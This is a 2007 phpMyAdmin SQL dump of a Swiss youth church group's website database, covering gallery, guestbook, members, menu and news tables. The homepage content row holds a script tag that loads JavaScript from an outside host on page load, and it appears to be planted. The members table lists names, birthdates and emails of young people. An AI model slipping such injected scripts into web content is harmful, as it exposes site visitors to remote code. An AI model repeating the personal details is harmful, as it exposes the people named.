-- phpMyAdmin SQL Dump
-- version 2.9.1.1
-- http://www.phpmyadmin.net
-- 
-- Host: localhost
-- Erstellungszeit: 05. Januar 2007 um 21:39
-- Server Version: 5.0.27
-- PHP-Version: 5.2.0
-- 
-- Datenbank: `jclubbeta`
-- 

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `bilder`
-- 

CREATE TABLE `bilder` (
  `bilder_ID` tinyint(4) NOT NULL auto_increment,
  `filename` varchar(200) collate utf8_unicode_ci NOT NULL,
  `erstellt` datetime NOT NULL default '0000-00-00 00:00:00',
  PRIMARY KEY  (`bilder_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=126 ;

-- 
-- Daten für Tabelle `bilder`
-- 

INSERT INTO `bilder` (`bilder_ID`, `filename`, `erstellt`) VALUES 
(2, 'ende_phase_1_01.jpg', '2006-07-23 01:01:45'),
(3, 'ende_phase_1_02.jpg', '2006-07-23 01:06:45'),
(4, 'ende_phase_1_03.jpg', '2006-07-23 01:07:37'),
(5, 'ende_phase_1_04.jpg', '2006-07-23 01:07:37'),
(6, 'ende_phase_1_05.jpg', '2006-07-23 01:07:37'),
(7, 'vor_umbau_01.jpg', '2006-07-23 01:10:06'),
(8, 'vor_umbau_02.jpg', '2006-07-23 01:10:06'),
(9, 'vor_umbau_03.jpg', '2006-07-23 01:10:06'),
(10, 'vor_umbau_04.jpg', '2006-07-23 01:10:06'),
(11, 'vor_umbau_05.jpg', '2006-07-23 01:10:06'),
(12, 'vor_umbau_06.jpg', '2006-07-23 01:10:06'),
(13, 'wand_1_01.jpg', '2006-07-23 01:10:45'),
(14, 'wand_1_02.jpg', '2006-07-23 01:10:45'),
(15, 'wand_1_03.jpg', '2006-07-23 01:10:45'),
(16, 'wand_1_04.jpg', '2006-07-23 01:10:45'),
(17, 'wand_1_05.jpg', '2006-07-23 01:10:45'),
(18, 'wand_1_06.jpg', '2006-07-23 01:10:45'),
(19, 'wand_1_07.jpg', '2006-07-23 01:10:45'),
(20, 'wand_1_08.jpg', '2006-07-23 01:10:45'),
(21, 'wand_2_01.jpg', '2006-07-23 01:11:17'),
(22, 'wand_2_02.jpg', '2006-07-23 01:11:17'),
(23, 'wand_2_03.jpg', '2006-07-23 01:11:17'),
(24, 'wand_2_04.jpg', '2006-07-23 01:11:17'),
(25, 'wand_2_05.jpg', '2006-07-23 01:11:17'),
(26, 'wand_2_06.jpg', '2006-07-23 01:11:17'),
(27, 'wand_2_07.jpg', '2006-07-23 01:11:17'),
(72, 'wand_1_017.jpg', '2007-01-04 01:53:15'),
(29, 'jg_programm06_04_lq.jpg', '2006-12-31 18:03:02'),
(71, 'photo074.jpg', '2007-01-01 04:36:19'),
(70, 'photo073.jpg', '2007-01-01 04:36:19'),
(69, 'photo072.jpg', '2007-01-01 04:36:19'),
(68, 'photo071.jpg', '2007-01-01 04:36:19'),
(67, 'photo070.jpg', '2007-01-01 04:36:19'),
(66, 'photo069.jpg', '2007-01-01 04:36:19'),
(65, 'photo068.jpg', '2007-01-01 04:36:19'),
(64, 'photo067.jpg', '2007-01-01 04:36:19'),
(63, 'photo066.jpg', '2007-01-01 04:36:19'),
(62, 'photo065.jpg', '2007-01-01 04:36:19'),
(61, 'photo064.jpg', '2007-01-01 04:36:19'),
(60, 'photo063.jpg', '2007-01-01 04:36:19'),
(59, 'photo062.jpg', '2007-01-01 04:36:19'),
(58, 'photo061.jpg', '2007-01-01 04:36:19'),
(57, 'photo060.jpg', '2007-01-01 04:36:19'),
(56, 'photo059.jpg', '2007-01-01 04:36:19'),
(55, 'photo058.jpg', '2007-01-01 04:36:19'),
(54, 'photo057.jpg', '2007-01-01 04:36:19'),
(53, 'photo056.jpg', '2007-01-01 04:36:19'),
(112, 'photo043.jpg', '2007-01-05 21:20:42'),
(74, 'vor_umbau_001.jpg', '2007-01-05 20:45:51'),
(75, 'vor_umbau_003.jpg', '2007-01-05 20:45:51'),
(76, 'vor_umbau_005.jpg', '2007-01-05 20:46:01'),
(111, 'photo042.jpg', '2007-01-05 21:20:42'),
(110, 'photo041.jpg', '2007-01-05 21:20:42'),
(109, 'photo040.jpg', '2007-01-05 21:20:42'),
(108, 'photo039.jpg', '2007-01-05 21:20:42'),
(107, 'photo038.jpg', '2007-01-05 21:20:42'),
(106, 'photo037.jpg', '2007-01-05 21:20:42'),
(105, 'photo036.jpg', '2007-01-05 21:20:42'),
(104, 'photo035.jpg', '2007-01-05 21:20:42'),
(103, 'photo034.jpg', '2007-01-05 21:20:42'),
(102, 'photo033.jpg', '2007-01-05 21:20:42'),
(101, 'photo032.jpg', '2007-01-05 21:20:42'),
(113, 'photo044.jpg', '2007-01-05 21:20:42'),
(114, 'photo045.jpg', '2007-01-05 21:20:42'),
(115, 'photo046.jpg', '2007-01-05 21:20:42'),
(116, 'photo047.jpg', '2007-01-05 21:20:42'),
(125, 'vor_umbau_004.jpg', '2007-01-05 21:35:18'),
(118, 'photo049.jpg', '2007-01-05 21:20:42'),
(119, 'photo050.jpg', '2007-01-05 21:20:42'),
(120, 'photo051.jpg', '2007-01-05 21:20:42'),
(121, 'photo052.jpg', '2007-01-05 21:20:42'),
(122, 'photo053.jpg', '2007-01-05 21:20:42'),
(123, 'photo054.jpg', '2007-01-05 21:20:42'),
(124, 'photo055.jpg', '2007-01-05 21:20:42');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `content`
-- 

CREATE TABLE `content` (
  `content_ID` int(10) NOT NULL auto_increment,
  `content_title` varchar(45) collate utf8_unicode_ci NOT NULL default '',
  `content_text` text collate utf8_unicode_ci NOT NULL,
  PRIMARY KEY  (`content_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=4 ;

-- 
-- Daten für Tabelle `content`
-- 

INSERT INTO `content` (`content_ID`, `content_title`, `content_text`) VALUES 
(1, 'Willkommen', '<p>Wir begr&uuml;ssen euch herzlich auf der Seite des J-Club''s aus Balsthal-Thal.<br />\r\n    <center>\r\n       <a href="./index.php?nav_id=44"><img src="index.php?nav_id=41&thumb=29"></a>\r\n	<br />\r\n        <br />\r\n        <script src=''http://www.nikodemus.net/free.php?cart-write'' type=''text/javascript''></script>\r\n     </center>'),
(2, 'Über uns', '<b>Wer seit ihr?</b><br />\r\nWir sind eine Gruppe junger Menschen aus verschiedenen Berufsschichten mit einem brennenden Herzen für Jesus.<br />\r\n<b>Und was macht ihr?</b><br />\r\nUnsere Absicht ist es, den Teenies das Evangelium auf moderne Art und Weise zu verkünden.<br />\r\n<b>Und was macht ihr an euren Abenden?</b><br />\r\nUm den Teenies zeitgemässe Worship-Musik bieten zu können, haben wir eine eigene JugendBand auf die Beine gestellt, welche schon an diversen Gemeindeveranstaltungen gespielt hat.\r\nDank der Gründung dieser Band haben wir die Möglichkeit die JG-Abende mit Worship zu starten<br />\r\n<b>Danke für das kurze Interview</b><br />\r\nBitte'),
(3, 'Programm', '<div style="margin-left:5px"><br>\r\n                  <a target="_blank" href="./index.php?nav_id=41&bild=29"><img src="./index.php?nav_id=41&bild=29" alt="JG-Programm"></a><br>\r\n  Was uns noch fehlt bist..... <b>DU</b><br></div>');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `gallery_alben`
-- 

CREATE TABLE `gallery_alben` (
  `ID` tinyint(4) NOT NULL auto_increment,
  `name` varchar(50) collate utf8_unicode_ci NOT NULL,
  `fid_parent` tinyint(4) NOT NULL default '0',
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=8 ;

-- 
-- Daten für Tabelle `gallery_alben`
-- 

INSERT INTO `gallery_alben` (`ID`, `name`, `fid_parent`) VALUES 
(1, 'Vor dem Umbau', 0),
(2, 'Herausnehmen der 1. Trennwand', 0),
(3, 'Herausnehmen der 2. Trennwand', 0),
(4, 'Ende der 1. Phase', 0),
(5, 'Fertigstellung', 0),
(6, 'Neujahrsfeier 05/06', 0);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `gallery_eintraege`
-- 

CREATE TABLE `gallery_eintraege` (
  `ID` tinyint(4) NOT NULL auto_increment,
  `fid_bild` tinyint(4) NOT NULL default '0',
  `fid_album` tinyint(4) NOT NULL default '0',
  `sequence` tinyint(11) NOT NULL default '0',
  `comment` text collate utf8_unicode_ci NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=105 ;

-- 
-- Daten für Tabelle `gallery_eintraege`
-- 

INSERT INTO `gallery_eintraege` (`ID`, `fid_bild`, `fid_album`, `sequence`, `comment`) VALUES 
(1, 7, 1, 1, ''),
(2, 8, 1, 8, ''),
(3, 9, 1, 3, ''),
(4, 10, 1, 7, ''),
(5, 11, 1, 9, ''),
(6, 12, 1, 10, ''),
(47, 71, 6, 19, ''),
(46, 70, 6, 18, ''),
(45, 69, 6, 17, ''),
(44, 68, 6, 16, ''),
(43, 67, 6, 15, ''),
(42, 66, 6, 14, ''),
(41, 65, 6, 13, ''),
(40, 64, 6, 12, ''),
(39, 63, 6, 11, ''),
(38, 62, 6, 10, ''),
(37, 61, 6, 9, ''),
(36, 60, 6, 8, ''),
(35, 59, 6, 7, ''),
(34, 58, 6, 6, ''),
(33, 57, 6, 5, ''),
(32, 56, 6, 4, ''),
(31, 55, 6, 3, ''),
(30, 54, 6, 2, ''),
(29, 53, 6, 1, ''),
(51, 13, 2, 9, ''),
(52, 14, 2, 8, ''),
(53, 15, 2, 6, ''),
(54, 16, 2, 7, ''),
(55, 17, 2, 5, ''),
(56, 18, 2, 3, ''),
(57, 19, 2, 1, ''),
(58, 20, 2, 2, ''),
(69, 22, 3, 3, ''),
(68, 21, 3, 2, ''),
(66, 72, 2, 4, ''),
(63, 74, 1, 2, ''),
(64, 75, 1, 4, ''),
(65, 76, 1, 6, ''),
(70, 23, 3, 4, ''),
(71, 24, 3, 5, ''),
(72, 25, 3, 6, ''),
(73, 26, 3, 7, ''),
(74, 27, 3, 8, ''),
(75, 2, 4, 1, ''),
(76, 3, 4, 2, ''),
(77, 4, 4, 3, ''),
(78, 5, 4, 4, ''),
(79, 6, 4, 5, ''),
(80, 101, 5, 1, ''),
(81, 102, 5, 2, ''),
(82, 103, 5, 3, ''),
(83, 104, 5, 4, ''),
(84, 105, 5, 5, ''),
(85, 106, 5, 6, ''),
(86, 107, 5, 7, ''),
(87, 108, 5, 8, ''),
(88, 109, 5, 9, ''),
(89, 110, 5, 10, ''),
(90, 111, 5, 11, ''),
(91, 112, 5, 12, ''),
(92, 113, 5, 13, ''),
(93, 114, 5, 14, ''),
(94, 115, 5, 15, ''),
(95, 116, 5, 16, ''),
(104, 125, 1, 5, ''),
(97, 118, 5, 18, ''),
(98, 119, 5, 19, ''),
(99, 120, 5, 20, ''),
(100, 121, 5, 21, ''),
(101, 122, 5, 22, ''),
(102, 123, 5, 23, ''),
(103, 124, 5, 24, '');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `gbook`
-- 

CREATE TABLE `gbook` (
  `gbook_ID` int(11) NOT NULL auto_increment,
  `gbook_ref_ID` int(11) NOT NULL default '0',
  `gbook_time` datetime NOT NULL default '0000-00-00 00:00:00',
  `gbook_name` varchar(50) collate utf8_unicode_ci NOT NULL,
  `gbook_email` varchar(50) collate utf8_unicode_ci NOT NULL,
  `gbook_hp` varchar(50) collate utf8_unicode_ci NOT NULL,
  `gbook_content` text collate utf8_unicode_ci NOT NULL,
  `gbook_title` varchar(50) collate utf8_unicode_ci NOT NULL,
  `gbook_smile_ID` int(11) NOT NULL default '0',
  PRIMARY KEY  (`gbook_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=14 ;

-- 
-- Daten für Tabelle `gbook`
-- 

INSERT INTO `gbook` (`gbook_ID`, `gbook_ref_ID`, `gbook_time`, `gbook_name`, `gbook_email`, `gbook_hp`, `gbook_content`, `gbook_title`, `gbook_smile_ID`) VALUES 
(1, 0, '2006-05-21 23:06:35', 'David Däster', 'dfd1985@gmail.com', 'www.jclub.ch', 'Der 1 Eintrag im neuen GB :-D', '1. Eintrag :-D', 0),
(2, 1, '2006-05-21 23:07:02', 'Der Kommentator', '', 'www.jclub.ch', 'Und der 1. Kommentar :-P', '', 0),
(3, 0, '2006-05-22 23:57:44', 'Test', 'admin@localhost', 'www.jclub.ch', 'Noch ein Eintrag', '', 0),
(4, 1, '2006-05-22 23:57:44', 'asdf', 'adsf@asdf.com', 'www.jclub.ch', '2. Kommentar...', '', 0),
(5, 0, '2006-06-02 11:59:33', 'Hans Ueli', 'hans.ueli@hansueli.ch', 'www.hansueli.ch', 'Dr Hansueli schribt ou mol en Tescht', 'Was, sogar Titel?', 0),
(6, 5, '2006-06-02 09:59:33', 'Hans Kommentar', '', '', 'Ja, u dr Kommentar für em Hansueli si Bitrag chunt o no grad.\r\nÄtsch', '', 0),
(7, 0, '2006-07-22 12:12:07', 'Simon', 'simon.daester@jesus.ch', '', 'Neuer Kommentar', '', 0),
(8, 0, '2006-09-17 21:25:46', 'Simon Holunder', 'meineemail', '', 'Kommentar zum neusten', '', 0),
(9, 8, '2006-09-19 20:23:52', 'Simon Holunder', 'tja', '', 'Kommentar scheint toll zu klappen', '', 0),
(10, 0, '2006-12-28 15:49:43', 'Test-Fritz', 'test@google.com', '', 'Ein Testeintrag direkt aufm Server', 'NÃ¤chster Eintrag aufm Server', 0),
(11, 10, '2006-12-28 15:53:53', 'Test-Fritz', 'test@google.com', '', 'Test-Comment', '', 0),
(12, 0, '2006-12-30 17:42:41', 'Dave', 'dfd1985@gmail.com', '', 'Dein Text zum testen', 'Zum Testen', 0),
(13, 0, '2007-01-01 04:38:05', 'für Simon', 'fuer@simon.de', '', 'Für Simon', 'Für Simon', 0);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `mailto`
-- 

CREATE TABLE `mailto` (
  `mailto_ID` int(11) NOT NULL auto_increment,
  `mailto_reciver_name` varchar(50) collate utf8_unicode_ci NOT NULL,
  `mailto_reciver_email` varchar(50) collate utf8_unicode_ci NOT NULL,
  `mailto_sender_name` varchar(50) collate utf8_unicode_ci NOT NULL,
  `mailto_sender_email` varchar(50) collate utf8_unicode_ci NOT NULL,
  `mailto_subject` varchar(50) collate utf8_unicode_ci NOT NULL,
  `mailto_content` varchar(255) collate utf8_unicode_ci NOT NULL,
  `mailto_hash` varchar(32) collate utf8_unicode_ci NOT NULL,
  `mailto_time` datetime NOT NULL default '0000-00-00 00:00:00',
  PRIMARY KEY  (`mailto_ID`),
  FULLTEXT KEY `mailto_content` (`mailto_content`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=9 ;

-- 
-- Daten für Tabelle `mailto`
-- 

INSERT INTO `mailto` (`mailto_ID`, `mailto_reciver_name`, `mailto_reciver_email`, `mailto_sender_name`, `mailto_sender_email`, `mailto_subject`, `mailto_content`, `mailto_hash`, `mailto_time`) VALUES 
(1, 'Dave', 'dfd1985@gmail.com', 'David DÃ¤ster', 'dfd1985@gmail.com', 'Testmail', 'Schauen, ob eine Antwort zurÃ¼ck kommt', '0f77898165fe03b2d593a0791faa2100', '2006-12-30 17:49:12'),
(2, 'Dave', 'dfd1985@gmail.com', 'HH', 'dfd1985@gmail.com', 'bb', 'bla', '0a9d76d6f51cc36c4226d8fc7212b223', '2006-12-30 20:18:32'),
(3, 'Dave', 'dfd1985@gmail.com', 'HH', 'dfd1985@gmail.com', 'bb', 'bla', '9d3b7bdb375fa2452fe208b160097dfe', '2006-12-30 20:27:40'),
(4, 'Dave', 'dfd1985@gmail.com', 'HH', 'dfd1985@gmail.com', 'bb', 'bla', '0d6818a5897cb169a13fd24fefbe544e', '2006-12-30 20:33:39'),
(5, 'Dave', 'dfd1985@gmail.com', 'Ich bins', 'simon_@gmx.net', 'Mail an DAve', 'Hallo erstmal', '23ca9b10450e3463ce198bcf8acf6916', '2006-12-30 20:47:33'),
(6, 'Dave', 'dfd1985@gmail.com', 'Ich bins', 'simon_@gmx.net', 'Mail an DAve', 'Hallo erstmal', 'e960d89041a4d089344b2c14709feaa0', '2006-12-30 20:49:31'),
(7, 'Dave', 'dfd1985@gmail.com', 'Ich bins', 'simon_@gmx.net', 'Mail an DAve', 'Hallo erstmal', 'aa794d661da02c627a1f1313bf5bac9c', '2006-12-30 20:55:17'),
(8, 'Dave', 'dfd1985@gmail.com', 'HH', 'dfd1985@gmail.com', 'bb', 'bla', '4f14e8a85579defebf18eb44bedb91a2', '2006-12-30 23:20:03');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `members`
-- 

CREATE TABLE `members` (
  `members_ID` int(11) NOT NULL auto_increment COMMENT 'De weisi wär du bisch',
  `members_name` varchar(50) collate utf8_unicode_ci NOT NULL COMMENT 'Längwilig, für Bürokrate',
  `members_spitzname` varchar(50) collate utf8_unicode_ci NOT NULL COMMENT 'Toll, zum Fertigmache',
  `members_birthday` date NOT NULL default '0000-00-00' COMMENT 'Alter schützt vor Torheit nicht',
  `members_song` varchar(100) collate utf8_unicode_ci NOT NULL COMMENT 'Ke Musiggschmack?',
  `members_hobby` varchar(100) collate utf8_unicode_ci NOT NULL COMMENT 'Längwilig',
  `members_food` varchar(100) collate utf8_unicode_ci NOT NULL COMMENT 'Grusig',
  `members_job` varchar(100) collate utf8_unicode_ci NOT NULL COMMENT 'Verdiensch so weni Cholä?',
  `members_motto` varchar(200) collate utf8_unicode_ci NOT NULL COMMENT 'Haut di mou dra!',
  `members_email` varchar(100) collate utf8_unicode_ci NOT NULL COMMENT 'so läng?',
  `members_FIDimage` varchar(200) collate utf8_unicode_ci NOT NULL COMMENT 'hesch ou scho besser usgseh',
  PRIMARY KEY  (`members_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci COMMENT='Die Mitgliedertabelle' AUTO_INCREMENT=13 ;

-- 
-- Daten für Tabelle `members`
-- 

INSERT INTO `members` (`members_ID`, `members_name`, `members_spitzname`, `members_birthday`, `members_song`, `members_hobby`, `members_food`, `members_job`, `members_motto`, `members_email`, `members_FIDimage`) VALUES 
(1, 'Benjamin Schläpfer', 'Bebu', '1982-03-06', 'Open the eyes of my heart', 'JG, Musizieren, Sport', 'Lassagne', 'Student an der STH Basel', 'What Would Jesus Do??', '', '8'),
(5, 'Soraya Brügger', 'surli', '1987-11-04', 'Chünig vo mym Härz', 'Klavierspielen, Reiten, JG, lesen', 'Salat', 'Köchin (in Ausbildung)', '', '', ''),
(3, 'David Däster', 'Dave', '1985-04-22', 'Watching Over You', 'JG, PC, Sport, Musik', 'Broccoli', 'Informatiker', 'Pray Until Something Happens!', '', '10'),
(4, 'Lukas Schläpfer', 'Lüdi', '1987-09-19', 'Lord I lift your name on high', 'Gamen, JG, PC, Sport', 'Lassagne', 'kaufmännischer Angestellter (in Ausbildung)', '-', '', '11'),
(6, 'Simon Däster', 'Simon', '1989-01-25', 'The days of Elijah', 'JS, JG, PC, Freundin, Musik', '', 'Schüler', '', 'simon_@gmx.net', ''),
(7, 'Daniel Schenk', 'Dani', '1989-09-26', '-', 'Klettern, Jungschar', '-', 'Polymechaniker (in Ausbildung)', '-', '', ''),
(8, 'Marco Flück', 'Marco', '1989-12-14', '-', 'Jungschar, Ping-Pong, JG, Skifahren', '-', 'Schüler', '-', '', ''),
(9, 'Jonas Däster', 'Schalk', '1990-05-24', 'Chönig vo mim Härz', 'Jungschar, Klettern', 'Raclette', 'kaufmännischer Angestellter (in Ausbildung)', 'Jesus lebt! Wer''s glaubt wird selig!', '', ''),
(10, 'Anna Gasser', 'Anna', '1991-03-21', 'Chönig vo mim Härz', 'lesen, in der Natur sein, Musik hören', 'Lasagne', '', '-', '', ''),
(11, 'Samuel Bader', 'Sämi', '1991-10-09', 'sick and tired', 'Fussball, Hockey, PC, JG', 'Schnipo', 'Schüler', '-', '', ''),
(12, 'Raphael Däster', '? (Alpha)', '1991-12-24', 'Awesome God', 'Sport, JG, Jungschi', 'Lasagne', 'Schüler', '', '', '');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `menu`
-- 

CREATE TABLE `menu` (
  `menu_ID` int(11) NOT NULL auto_increment COMMENT 'Jetzt weisi wär du bisch',
  `menu_topid` int(11) NOT NULL default '0' COMMENT 'Stohsch wieder über de andere',
  `menu_position` int(11) NOT NULL default '0' COMMENT '"Die Ersten werden die LETZTEN sein" ',
  `menu_name` text collate utf8_unicode_ci NOT NULL COMMENT 'Sgit besseri Näme',
  `menu_page` int(11) NOT NULL default '0' COMMENT 'Gang mou dört go sueche!',
  `menu_pagetyp` enum('mod','pag') collate utf8_unicode_ci NOT NULL default 'mod' COMMENT 'Machts e Unterschie?!?',
  `menu_modvar` varchar(45) collate utf8_unicode_ci NOT NULL default '' COMMENT 'Wotsch no öppis mitgäh?!?',
  `menu_display` enum('0','1') collate utf8_unicode_ci NOT NULL default '1' COMMENT 'Wotsch mi gseh?!?',
  PRIMARY KEY  (`menu_ID`),
  KEY `menu_topid` (`menu_topid`),
  KEY `menu_page` (`menu_page`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=45 ;

-- 
-- Daten für Tabelle `menu`
-- 

INSERT INTO `menu` (`menu_ID`, `menu_topid`, `menu_position`, `menu_name`, `menu_page`, `menu_pagetyp`, `menu_modvar`, `menu_display`) VALUES 
(25, 0, 1, 'Home', 1, 'pag', '', '1'),
(26, 0, 2, 'Über uns', 2, 'pag', '', '1'),
(33, 0, 7, 'G&auml;stebuch', 1, 'mod', '', '1'),
(44, 0, 5, 'Programm', 3, 'pag', '', '1'),
(40, 0, 8, 'Gallery', 3, 'mod', '', '1'),
(41, 0, 100, 'image', 4, 'mod', '', '0'),
(42, 0, 4, 'Mitglieder', 5, 'mod', '', '1'),
(43, 0, 3, 'News', 6, 'mod', '', '1');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `modules`
-- 

CREATE TABLE `modules` (
  `modules_ID` int(11) NOT NULL auto_increment,
  `modules_name` varchar(45) collate utf8_unicode_ci NOT NULL,
  PRIMARY KEY  (`modules_ID`),
  UNIQUE KEY `modules` (`modules_name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=7 ;

-- 
-- Daten für Tabelle `modules`
-- 

INSERT INTO `modules` (`modules_ID`, `modules_name`) VALUES 
(1, 'gbook.php'),
(2, 'gbook2.php'),
(3, 'gallery.php'),
(4, 'image.php'),
(5, 'members.php'),
(6, 'news.php');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `news`
-- 

CREATE TABLE `news` (
  `news_ID` int(11) NOT NULL auto_increment,
  `news_ref_ID` int(11) NOT NULL default '0',
  `news_time` datetime NOT NULL,
  `news_name` varchar(50) collate utf8_unicode_ci NOT NULL,
  `news_email` varchar(50) collate utf8_unicode_ci NOT NULL,
  `news_hp` varchar(50) collate utf8_unicode_ci NOT NULL,
  `news_content` text collate utf8_unicode_ci NOT NULL,
  `news_title` varchar(50) collate utf8_unicode_ci NOT NULL,
  `news_smile_ID` int(11) NOT NULL,
  PRIMARY KEY  (`news_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=2 ;

-- 
-- Daten für Tabelle `news`
-- 

INSERT INTO `news` (`news_ID`, `news_ref_ID`, `news_time`, `news_name`, `news_email`, `news_hp`, `news_content`, `news_title`, `news_smile_ID`) VALUES 
(1, 0, '2006-10-18 22:53:52', 'Name', 'mail@jclub.ch', 'http://www.jclub.ch', '1. News.\r\nSchön, oder?', '1. Newseintrag', 0);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `smilies`
-- 

CREATE TABLE `smilies` (
  `smilies_ID` int(11) NOT NULL auto_increment,
  `smilies_file` varchar(50) collate utf8_unicode_ci NOT NULL,
  PRIMARY KEY  (`smilies_ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=2 ;

-- 
-- Daten für Tabelle `smilies`
-- 

